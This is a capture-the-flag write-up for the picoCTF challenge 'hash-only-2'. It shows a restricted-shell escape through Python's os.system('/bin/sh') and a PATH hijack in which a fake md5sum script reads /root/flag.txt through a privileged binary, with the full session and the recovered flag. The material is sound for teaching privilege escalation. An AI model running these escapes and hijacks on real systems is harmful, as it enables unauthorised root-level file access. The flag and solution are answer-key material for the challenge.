# hash-only-2
Challenge Description:
> Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!

CTF: <b>picoCTF</b> (picoGym)<br>Difficulty: <b>Medium</b>

<b>[Jump to solution](#solution)</b>

## Hints
No hints were given by the challenge author, but here's one from me for those looking for a lead.
<details>
<summary>Hint 1</summary>

> What is rbash?
</details>

## Procedure
Logging into the remote machine and looking around the current directory shows that the `flaghasher` binary is no longer in our directory, but can still be run. This probably means it's now in one of the `bin` directories listed in `PATH`.
```
ctf-player@pico-chall$ ls
ctf-player@pico-chall$ ls -a
.  ..  .cache  .profile
ctf-player@pico-chall$ flaghasher
Computing the MD5 hash of /root/flag.txt.... 

37422299daa211fef2e6686065efa13f  /root/flag.txt
```
Moreover, trying to move directories gives us an error message.
```
ctf-player@pico-chall$ cd /usr/local/bin
-rbash: cd: restricted
```
The error message mentions `rbash`, so we can deduce that we are running in <b>restricted bash</b>, a version of bash meant to heavily limit what we can do. For example, we can't change directories, modify environment variables, or even redirect output to files (so modifying a file using cat or echo is not an option).

After a bit of searching about rbash, I came across several methods of breaking out of rbash and escalating privileges to the normal shell. One such method is by running python to spawn a shell, like so:
```
ctf-player@pico-chall$ python3
Python 3.8.10 (default, Mar 18 2025, 20:04:55) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system('/bin/sh')
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ cd /usr/local/bin
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ ls
flaghasher
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ 
```
As you can see, we now have privileges to change directory. We can now pretend this is hash-only-1 and perform the same actions to get the flag.
```
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ cat << exit > md5sum
> #!/bin/bash
> /bin/cat /root/flag.txt
> exit
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ /bin/chmod 777 md5sum
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ export PATH=.
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ ./flaghasher
Computing the MD5 hash of /root/flag.txt.... 

hammy{u win - hammy}\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ 
```

## Solution
1. Break out of `rbash` by running `python3` and executing the following commands:
    - `import os`
    - `os.system('/bin/sh')`
2. Change directories to where `flaghasher` is stored and perform the same actions as in hash-only-1 to print the flag.
    - `cd /usr/local/bin`

## Key Takeaways
`rbash`, and python as a viable method of escalating privileges